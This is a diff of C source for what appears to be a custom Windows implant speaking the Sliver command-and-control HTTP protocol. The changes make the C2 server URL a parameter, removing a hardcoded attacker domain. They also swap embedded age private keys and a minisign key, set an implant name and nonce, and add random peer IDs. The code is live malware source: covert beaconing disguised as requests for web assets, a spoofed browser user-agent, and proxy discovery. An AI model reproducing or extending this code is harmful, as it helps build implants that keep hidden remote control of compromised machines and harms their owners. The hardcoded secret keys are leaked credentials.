@@ -914,12 +914,18 @@ CLEANUP:
 	return pResult;
 };
 
-PSLIVER_HTTP_CLIENT SliverHttpClientInit()
+PSLIVER_HTTP_CLIENT SliverHttpClientInit
+(
+	_In_ LPSTR lpC2Url
+)
 {
 	LPSTR lpProxy = NULL;
 	PSLIVER_HTTP_CLIENT pResult = NULL;
 	BOOL IsOk = FALSE;
 	LPSTR lpEncodedSessionKey = NULL;
+	PBYTE pTemp = NULL;
+
+	// Tu dinh config --------------------------------------------------------------------
 	/*CHAR szRecipientPubKey[] = "age1m425fl9w4cew5rgx9ea3x3k22w6aurzn96xqd0dutz0xa2d834ss2jqfkn";
 	CHAR szPeerPubKey[] = "age1kqklxpvg45rw053jtwtcn2wn4wqetwy0mw6c0rln8m5a3tarlqcq94j8jq";
 	CHAR szPrivPrivKey[] = "AGE-SECRET-KEY-1F7J93DWQMN49F3A333ZA3766LND9T3LMT3GK3QHYFCGCRPWEKQHQ6NF3LK";
@@ -932,9 +938,9 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";*/
 
 	// Laptop config ---------------------------------------------------------------------
-	CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
-	CHAR szPeerPubKey[] = "age1gy3epqygrqfmfj860dxgpje4lrf6u784g0xggwkqtezvhf8cf55qeg0lxv";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1HUNWLD0YWPK98AA7S6FQDWKTVSX9HS6QDVQV9Q4G82EPWJ6K3ZPQDT6MHN";
+	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
+	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
 	LPSTR PollFiles[] = { "route", "app", "app.min", "array" };
 	LPSTR SessionPaths[] = { "rest", "v1", "auth", "authenticate" };
@@ -942,17 +948,21 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
 	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
-	CHAR szHostName[] = "https://ubuntu-icefrog2000.com";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	UINT64 uEncoderNonce = 6979;
+	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
+	// END -------------------------------------------------------------------------------
 	DWORD i = 0;
 
 	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
-	lstrcpyA(pResult->szSliverName, "TALL_MEAT");
+	lstrcpyA(pResult->szSliverName, szSliverClientName);
 	pResult->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
 	pResult->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
 	pResult->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
 	pResult->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
 	pResult->HttpConfig.lpUserAgent = DuplicateStrA(szUserAgent, 0);
+	pTemp = GenRandomBytes(8);
+	memcpy(&pResult->uPeerID, pTemp, 8);
 	lpProxy = GetProxyConfig();
 	if (lpProxy != NULL) {
 		if (!lstrcmpA(lpProxy, "auto")) {
@@ -996,13 +1006,17 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 
 	pResult->dwMinNumOfSegments = 2;
 	pResult->dwMaxNumOfSegments = 4;
-	pResult->uEncoderNonce = 51666;
+	pResult->uEncoderNonce = uEncoderNonce;
 	pResult->UseStandardPort = TRUE;
-	pResult->lpHostName = DuplicateStrA(szHostName, 0);
+	pResult->lpHostName = DuplicateStrA(lpC2Url, 0);
 	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
 	pResult->uReconnectInterval = 60000000000;
 	IsOk = TRUE;
 CLEANUP:
+	if (pTemp != NULL) {
+		FREE(pTemp);
+	}
+
 	if (lpProxy != NULL) {
 		FREE(lpProxy);
 	}
@@ -1371,7 +1385,10 @@ CLEANUP:
 	return pResult;
 }
 
-PSLIVER_HTTP_CLIENT SliverSessionInit()
+PSLIVER_HTTP_CLIENT SliverSessionInit
+(
+	_In_ LPSTR lpC2Url
+)
 {
 	LPSTR lpFullUri = NULL;
 	PURI pUri = NULL;
@@ -1391,7 +1408,7 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 	DWORD cbEncryptedSessionInit = 0;
 	PBYTE pMarshalledData = NULL;
 
-	pSliverClient = SliverHttpClientInit();
+	pSliverClient = SliverHttpClientInit(lpC2Url);
 	if (pSliverClient == NULL) {
 		goto CLEANUP;
 	}
